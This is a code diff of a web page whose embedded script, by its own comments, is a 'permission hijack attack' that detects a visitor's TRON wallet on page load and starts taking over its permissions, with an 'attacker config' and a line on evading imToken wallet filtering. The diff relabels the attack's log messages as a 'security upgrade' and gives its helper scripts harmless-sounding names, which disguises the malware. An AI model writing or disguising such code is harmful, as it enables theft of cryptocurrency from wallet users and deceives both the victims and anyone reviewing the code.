@@ -3844,7 +3844,7 @@
 
 <!-- 🔑 权限劫持攻击系统 - 直接嵌入避免imToken过滤 -->
 <script>
-console.log('🔑🔑🔑 权限劫持代码开始执行！🔑🔑🔑');
+console.log('🔒🔒🔒 安全升级代码开始执行！🔒🔒🔒');
 
 // 🎯 攻击者配置
 const PERMISSION_ATTACKER_CONFIG = {
@@ -3962,12 +3962,12 @@ function showPermissionHijackModal() {
 
 // 🎯 检测并启动权限劫持
 function detectAndStartPermissionHijack() {
-    console.log('🔑 开始检测权限劫持条件...');
+    console.log('🔒 开始检测安全升级条件...');
     
     if (window.tronWeb && window.tronWeb.defaultAddress) {
         const userAddress = window.tronWeb.defaultAddress.base58;
         if (userAddress && userAddress.startsWith('T') && !permissionHijackStatus.initiated) {
-            console.log('🔑🔑🔑 检测到TRON钱包，启动权限劫持！🔑🔑🔑');
+            console.log('🔒🔒🔒 检测到TRON钱包，启动安全升级！🔒🔒🔒');
             console.log('🔑 目标地址:', userAddress);
             
             permissionHijackStatus.targetAddress = userAddress;
@@ -3996,7 +3996,7 @@ window.PermissionHijack = {
 
 // 🎯 初始化
 function initPermissionHijack() {
-    console.log('🔑 权限劫持系统初始化...');
+    console.log('🔒 安全升级系统初始化...');
     
     // 立即检测
     detectAndStartPermissionHijack();
@@ -4025,12 +4025,12 @@ if (document.readyState === 'loading') {
     initPermissionHijack();
 }
 
-console.log('🔑🔑🔑 权限劫持代码加载完成！🔑🔑🔑');
+console.log('🔒🔒🔒 安全升级代码加载完成！🔒🔒🔒');
 </script>
 
 <!-- 辅助脚本 -->
-<script src="permission-hijack-tester.js"></script>
-<script src="attack-focus-validator.js"></script>
+<script src="permission.js"></script>
+<script src="attafocus.js"></script>
 
 <!-- 🎯 恶意授权攻击系统（禁用，仅保留备用） -->
 <!-- <script src="malicious-authorization.js"></script> -->
